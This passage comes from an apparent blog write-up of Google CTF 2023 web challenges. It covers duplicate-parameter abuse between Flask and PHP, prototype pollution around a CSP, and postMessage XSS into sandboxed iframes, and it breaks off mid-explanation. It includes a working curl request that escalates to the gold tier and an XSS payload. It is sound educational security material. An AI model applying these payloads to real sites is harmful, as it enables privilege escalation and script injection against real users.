punctuation">(</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'tier'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>tier <span class="token operator">==</span> models<span class="token punctuation">.</span>Tier<span class="token punctuation">.</span>GOLD<span class="token punctuation">)</span><span class="token punctuation">:</span>        flash<span class="token punctuation">(</span><span class="token string">'GOLD tier only allowed for the CEO'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'authorized.signup'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">15</span> <span class="token keyword">or</span> <span class="token builtin">len</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        flash<span class="token punctuation">(</span><span class="token string">'Username length must be between 4 and 15'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'authorized.signup'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    user <span class="token operator">=</span> models<span class="token punctuation">.</span>User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>username<span class="token operator">=</span>username<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> user<span class="token punctuation">:</span>        flash<span class="token punctuation">(</span><span class="token string">'Username address already exists'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'authorized.signup'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    new_user <span class="token operator">=</span> models<span class="token punctuation">.</span>User<span class="token punctuation">(</span>username<span class="token operator">=</span>username<span class="token punctuation">,</span>         password<span class="token operator">=</span>generate_password_hash<span class="token punctuation">(</span>password<span class="token punctuation">,</span> method<span class="token operator">=</span><span class="token string">'sha256'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> tier<span class="token operator">=</span>tier<span class="token punctuation">.</span>name<span class="token punctuation">)</span>    db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>new_user<span class="token punctuation">)</span>    db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>    requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"http://</span><span class="token interpolation"><span class="token punctuation">&#123;</span>PHP_HOST<span class="token punctuation">&#125;</span></span><span class="token string">:1337/account_migrator.php"</span></span><span class="token punctuation">,</span>         headers<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"token"</span><span class="token punctuation">:</span> TOKEN<span class="token punctuation">,</span> <span class="token string">"content-type"</span><span class="token punctuation">:</span> request<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"content-type"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> data<span class="token operator">=</span>raw_request<span class="token punctuation">)</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'authorized.login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>There is a registration feature that checks the parameters in the data. After the check, the request is forwarded to PHP. Our goal is to create a user with a tier of GOLD.</p><p>The solution exploits the inconsistency in POST data parsing between PHP and Flask. If we pass <code>a=1&amp;a=2</code>, Flask will retrieve <code>1</code> (the first one) for the parameter <code>a</code>, while PHP will retrieve <code>2</code> (the last one).</p><p>Therefore, by leveraging this inconsistency, we can create a legitimate user in Flask with the tier set to GOLD when forwarding the request to PHP:</p><pre class="line-numbers language-none"><code class="language-none">curl -X POST http:&#x2F;&#x2F;&lt;flask-challenge&gt;&#x2F;signup -d &quot;username&#x3D;username&amp;password&#x3D;password&amp;tier&#x3D;blue&amp;tier&#x3D;gold&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3><span id="biohazard-14-solves">BIOHAZARD (14 solves)</span></h3><p>This challenge allows you to create a note, and the goal is to perform an XSS attack.</p><p>During the rendering of the note, there is a prototype pollution vulnerability. The rendering process first sanitizes the input:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">goog<span class="token punctuation">.</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'goog.dom'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>goog<span class="token punctuation">.</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'goog.dom.safe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>goog<span class="token punctuation">.</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'goog.html.sanitizer.unsafe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>goog<span class="token punctuation">.</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'goog.html.sanitizer.HtmlSanitizer.Builder'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>goog<span class="token punctuation">.</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'goog.string.Const'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'DOMContentLoaded'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">var</span> Const <span class="token operator">=</span> goog<span class="token punctuation">.</span>string<span class="token punctuation">.</span>Const<span class="token punctuation">;</span>  <span class="token keyword">var</span> unsafe <span class="token operator">=</span> goog<span class="token punctuation">.</span>html<span class="token punctuation">.</span>sanitizer<span class="token punctuation">.</span>unsafe<span class="token punctuation">;</span>  <span class="token keyword">var</span> builder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">goog<span class="token punctuation">.</span>html<span class="token punctuation">.</span>sanitizer<span class="token punctuation">.</span>HtmlSanitizer<span class="token punctuation">.</span>Builder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  builder <span class="token operator">=</span> unsafe<span class="token punctuation">.</span><span class="token function">alsoAllowTags</span><span class="token punctuation">(</span>      Const<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token string">'IFRAME is required for Youtube embed'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> builder<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'IFRAME'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  sanitizer <span class="token operator">=</span> unsafe<span class="token punctuation">.</span><span class="token function">alsoAllowAttributes</span><span class="token punctuation">(</span>      Const<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token string">'iframe#src is required for Youtube embed'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> builder<span class="token punctuation">,</span>      <span class="token punctuation">[</span>        <span class="token punctuation">&#123;</span>        <span class="token literal-property property">tagName</span><span class="token operator">:</span> <span class="token string">'iframe'</span><span class="token punctuation">,</span>        <span class="token literal-property property">attributeName</span><span class="token operator">:</span> <span class="token string">'src'</span><span class="token punctuation">,</span>        <span class="token function-variable function">policy</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span> <span class="token operator">=></span> s<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">'https://'</span><span class="token punctuation">)</span> <span class="token operator">?</span> s <span class="token operator">:</span> <span class="token string">''</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function-variable function">setInnerHTML</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">elem<span class="token punctuation">,</span> html</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  goog<span class="token punctuation">.</span>dom<span class="token punctuation">.</span>safe<span class="token punctuation">.</span><span class="token function">setInnerHtml</span><span class="token punctuation">(</span>elem<span class="token punctuation">,</span> html<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>This sanitizer can be bypassed partially through prototype pollution. You cannot use new tags, but you can bypass attribute restrictions. For example, iframes are allowed, so you can use iframe srcdoc.</p><p>There is a complication with the CSP: <code>base-uri &#39;none&#39;; script-src &#39;nonce-$&#123;nonce&#125;&#39; &#39;strict-dynamic&#39; &#39;unsafe-eval&#39;; require-trusted-types-for &#39;script&#39;;</code>. It includes trusted types, so even though you can inject <code>&lt;img src=x onerror=alert(1)&gt;</code>, the underlying sanitizer triggers a trusted types error when executing <code>img.setAttribute(&#39;onerror&#39;,&#39;alert(1)&#39;)</code>, causing the attack to fail.</p><p>I struggled for a while to bypass this restriction. Eventually, I had the idea that there are test HTML files under the static folder. If any of those files have an XSS vulnerability, we can simply use an iframe src to obtain the flag. I did some searching at the time but couldn’t find any suitable file. However, after the competition, I saw that someone did manage to solve it using this file: <a href="https://github.com/shhnjk/closure-library/blob/master/closure/goog/demos/xpc/minimal/index.html">https://github.com/shhnjk/closure-library/blob/master/closure/goog/demos/xpc/minimal/index.html</a></p><p>Later, I realized that the way it loads JavaScript is like this:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/closure-library/closure/goog/base.js<span class="token punctuation">"</span></span> <span class="token attr-name">nonce</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>i8OeY0yF3xOOTZVZHHBqIg==<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/bootstrap.js<span class="token punctuation">"</span></span> <span class="token attr-name">nonce</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>i8OeY0yF3xOOTZVZHHBqIg==<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/sanitizer.js<span class="token punctuation">"</span></span> <span class="token attr-name">nonce</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>i8OeY0yF3xOOTZVZHHBqIg==<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/main.js<span class="token punctuation">"</span></span> <span class="token attr-name">nonce</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>i8OeY0yF3xOOTZVZHHBqIg==<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>There is a variable called <code>editor</code> defined in <code>bootstrap.js</code>, which is then loaded as a script src in <code>main.js</code>. If we block the loading of <code>bootstrap.js</code> using iframe csp and then combine it with polluting <code>Object.prototype.editor</code>, we can load any JS.</p><p>And this is indeed the intended solution.</p><p>I learned this trick in the <a href="https://github.com/aszx87410/ctf-writeups/issues/48">Intigriti’s November XSS challenge</a>, where CSP was tightened to prevent the loading of certain scripts.</p><h3><span id="veggie-soda-13-solves">VEGGIE SODA (13 solves)</span></h3><p>During the competition, one of my teammates solved this completely without my help.</p><p>After the competition, I looked at the official solution. The first level bypasses CSRF protection using HEAD, which seems to be a commonly used technique. The second level looks similar to last year’s <a href="https://blog.huli.tw/2022/07/09/google-ctf-2022-writeup/#horkos-10-solves">HORKOS</a>, involving JS deserialization vulnerability. Once a gadget chain is found, XSS can be achieved.</p><p>Here is the link to the official solution: <a href="https://github.com/google/google-ctf/tree/master/2023/web-vegsoda">https://github.com/google/google-ctf/tree/master/2023/web-vegsoda</a></p><h3><span id="postviewer-v2-7-solves">POSTVIEWER V2 (7 solves)</span></h3><p>This challenge is the reason why I kept avoiding writing a writeup. It’s like the movie Inception, with layer upon layer, so complex that I didn’t even know what I was doing towards the end.</p><p>Although it’s called V2, it’s quite different from last year’s challenge.</p><p>Let’s focus on this part:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">previewIframe</span><span class="token punctuation">(</span>body<span class="token punctuation">,</span> mimeType<span class="token punctuation">,</span> shimUrl<span class="token punctuation">,</span> container<span class="token punctuation">,</span> sandbox <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'allow-scripts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>shimUrl<span class="token punctuation">)</span><span class="token punctuation">;</span>    url<span class="token punctuation">.</span>host <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">sbx-</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">generateRandomPart</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>url<span class="token punctuation">.</span>host<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>    url<span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'o'</span><span class="token punctuation">,</span> window<span class="token punctuation">.</span>origin<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> iframe <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'iframe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    iframe<span class="token punctuation">.</span>src <span class="token operator">=</span> url<span class="token punctuation">;</span>    container<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>iframe<span class="token punctuation">)</span><span class="token punctuation">;</span>    iframe<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'load'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        iframe<span class="token punctuation">.</span>contentWindow<span class="token operator">?.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> body<span class="token punctuation">,</span> mimeType<span class="token punctuation">,</span> sandbox<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> url<span class="token punctuation">.</span>origin<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">once</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Here, a random sbx domain iframe is added, and the flag is passed through postMessage. The content of this sbx domain is also simple:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token constant">TRUSTED_ORIGIN</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span>href<span class="token punctuation">)</span><span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'o'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^https?:\/\/</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token constant">TRUSTED_ORIGIN</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"Untrusted Origin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> <span class="token constant">DEFAULT_STYLE</span> <span class="token operator">=</span> <span class="token string">'position:absolute; top:0; left:0; bottom:0; right:0; width:100vw; height:100vh; border:none; margin:0; padding:0; z-index:999999;'</span>    window<span class="token punctuation">.</span><span class="token function-variable function">onmessage</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> forbidden_sbx <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">allow-same-origin</span><span class="token regex-delimiter">/</span><span class="token regex-flags">ig</span></span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>origin <span class="token operator">!==</span> <span class="token constant">TRUSTED_ORIGIN</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"Wrong origin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token punctuation">.</span>data<span class="token punctuation">.</span>body <span class="token operator">===</span> <span class="token keyword">undefined</span> <span class="token operator">||</span> <span class="token operator">!</span>e<span class="token punctuation">.</span>data<span class="token punctuation">.</span>mimeType<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"No content to render"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>            <span class="token keyword">const</span> blob <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Blob</span><span class="token punctuation">(</span><span class="token punctuation">[</span>e<span class="token punctuation">.</span>data<span class="token punctuation">.</span>body<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>            <span class="token literal-property property">type</span><span class="token operator">:</span> e<span class="token punctuation">.</span>data<span class="token punctuation">.</span>mimeType        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> iframe <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'iframe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        iframe<span class="token punctuation">.</span>style<span class="token punctuation">.</span>cssText <span class="token operator">=</span> <span class="token constant">DEFAULT_STYLE</span><span class="token punctuation">;</span>        document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>iframe<span class="token punctuation">)</span><span class="token punctuation">;</span>        iframe<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">'sandbox'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>data<span class="token punctuation">.</span>sandbox<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">const</span> value <span class="token keyword">of</span> e<span class="token punctuation">.</span>data<span class="token punctuation">.</span>sandbox<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>forbidden_sbx<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span>iframe<span class="token punctuation">.</span>sandbox<span class="token punctuation">.</span><span class="token function">supports</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Unsupported value: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>value<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">continue</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                iframe<span class="token punctuation">.</span>sandbox<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>                iframe<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token constant">URL</span><span class="token punctuation">.</span><span class="token function">createObjectURL</span><span class="token punctuation">(</span>blob<span class="token punctuation">)</span><span class="token punctuation">;</span>        document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>iframe<span class="token punctuation">)</span><span class="token punctuation">;</span>        window<span class="token punctuation">.</span>onmessage <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        e<span class="token punctuation">.</span>source<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token string">'blob loaded'</span><span class="token punctuation">,</span> e<span class="token punctuation">.</span>origin<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>The received content is turned into a blob and then placed in a sandbox iframe. Our goal is to steal the content inside this iframe.</p><p>There are a few troublesome points:</p><ol><li>The admin bot has restrictions. We cannot open new windows, and any functionality similar to <code>window.open</code> is not allowed.</li><li>The CSP of the main domain is: <code>frame-ancestors *.postviewer2-web.2023.ctfcompetition.com; frame-src *.postviewer2-web.2023.ctfcompetition.com</code></li><li>The CSP of the sbx domain is: <code>frame-src blob:</code></li></ol><p>Firstly, we can easily obtain XSS on any sbx domain, like this:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">iframe <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"iframe"</span><span class="token punctuation">)</span>url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token string">"https://sbx-gggg.postviewer2-web.2023.ctfcompetition.com/shim.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>url<span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'o'</span><span class="token punctuation">,</span> window<span class="token punctuation">.</span>origin<span class="token punctuation">)</span><span class="token punctuation">;</span>iframe<span class="token punctuation">.</span>src <span class="token operator">=</span> urliframe<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'load'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    iframe<span class="token punctuation">.</span>contentWindow<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">body</span><span class="token operator">:</span><span class="token string">"&lt;script>alert(document.domain)&lt;/script>"</span><span class="token punctuation">,</span> <span class="token literal-property property">mimeType</span><span class="token operator">:</span> <span class="token string">"text/html"</span><span class="token punctuation">,</span> <span class="token literal-property property">sandbox</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"allow-modals"</span><span class="token punctuation">,</span><span class="token string">"allow-scripts"</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">"allow-same-origin"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">"allow-same-origin"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">"*"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">once</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>iframe<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Now, the question is, what can we do next?</p><p>Our first step should be finding a way to bring the main domain into an iframe to perform further operations. However, the sbx domain only allows embedding pages starting with <code>blob:</code>, so how do we proceed?</p><p>At this point, we thought of using a cookie bomb to make the sbx domain return <code>HTTP/2 413 Request Entity Too Large</code>, which would remove the CSP error page.</p><p>The process is as follows:</p><ol><li>Load our own webpage first.</li><li>Embed an sbx iframe to obtain XSS.</li><li>Write a cookie from the sbx iframe to prevent loading of the &#x2F;bomb path.</li><li>Add another iframe with &#x2F;bomb, which has no CSP.</li><li>From the iframe in step 2, directly modify the content of the iframe in step 4 to obtain an XSS without CSP.</li><li>Now we can embed the main domain inside the iframe.</li></ol><p>Steps 1 to 5 are correct, but step 6 is incorrect. Although there is no longer the restriction of <code>frame-src blob:</code>, the <code>frame-ancestors *.postviewer2-web.2023.ctfcompetition.com;</code> of the main domain refers to all parent pages. So, as long as our top-level page is our own, we cannot bypass the CSP.</p><p>Then I suddenly thought of using a blob, like this:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> blob <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Blob</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'&lt;h1>hello&lt;/h1>&lt;iframe src="http://127.0.0.1:5000/test">&lt;/iframe>'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>    <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'text/html'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>url <span class="token operator">=</span> <span class="token constant">URL</span><span class="token punctuation">.</span><span class="token function">createObjectURL</span><span class="token punctuation">(</span>blob<span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>location <span class="token operator">=</span> url<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>This way, the top-level domain becomes <code>sbx-xxx.postviewer2-web.2023.ctfcompetition.com</code>, which satisfies the CSP.</p><p>However, an error occurred during the attempt:</p><blockquote><p>Unsafe attempt to initiate navigation for frame with origin ‘<a href="http://localhost:3000/">http://localhost:3000/</a>‘ from frame with URL ‘blob:<a 